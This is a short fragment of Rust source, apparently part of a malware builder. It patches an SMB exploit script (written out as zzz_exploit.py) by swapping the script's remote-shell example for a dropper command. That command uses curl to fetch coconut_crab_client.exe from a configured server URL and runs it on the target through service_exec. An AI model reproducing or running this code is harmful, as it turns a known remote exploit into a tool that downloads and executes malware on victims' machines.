...
fn main() {
    ...
    let remote_shell_regex = Regex::new(r" +# example of creating a remote shell on the remote host(?:[\r\n]+[^\r\n]+){9}").expect("Invalid regex");
    let dropper_text = format!("    smbConn = conn.get_smbconnection()\n    service_exec(smbConn, r'curl {} -o coconut_crab_client.exe; .\\coconut_crab_client.exe')", COCONUT_CRAB_SERVER_URL);
    ...
    fs::write("zzz_exploit.py", content_replaced.as_bytes()).expect("Failed to write exploit code to file");
